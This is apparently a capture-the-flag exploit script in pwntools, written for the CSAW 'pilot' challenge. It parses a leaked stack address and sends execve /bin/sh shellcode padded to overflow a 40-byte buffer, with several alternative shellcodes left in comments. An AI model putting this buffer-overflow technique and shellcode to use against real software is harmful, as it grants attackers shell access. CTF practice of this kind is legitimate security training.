from pwn import *

# p = remote("pwn.chal.csaw.io", 8464)
p = process('./pilot')
gdb.attach(p, '''
set disassembly-flavor intel
set height 0
b *0x400b34
c
''')

p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
location = p.recvline()
location = int(location[len('Location:     '):].strip(),16)
print hex(location)

# shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
main = 0x4009a6

# shellcode = shellcraft.sh()
# shellcode = '1\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
payload = shellcode + 'A'*(40 -len(shellcode)) + 'BBBBBBBB'
# payload = 'A'*40 + p64(main)*10
# shellcode = p64(location + 8) + shellcode
# payload = shellcode  + 'A'*10
print repr(payload)

p.sendline(payload)

p.interactive()
